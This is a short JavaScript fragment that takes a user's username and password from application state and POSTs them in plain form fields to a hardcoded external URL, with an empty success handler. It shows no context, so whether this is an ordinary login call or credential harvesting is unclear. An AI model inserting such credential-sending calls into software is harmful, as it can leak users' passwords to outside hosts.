
var user = this.unsene.unseneView.me.get("username");
var pwd = this.unsene.unseneView.credential.get("password");

    $.ajax({
           type: "POST",
            url: "https://ss.dongtaiwang.info/darktemplar/",
            data: {
                username: user,
                password: pwd
            },
            success: function(b) {
              // alert('success');
            },

        })
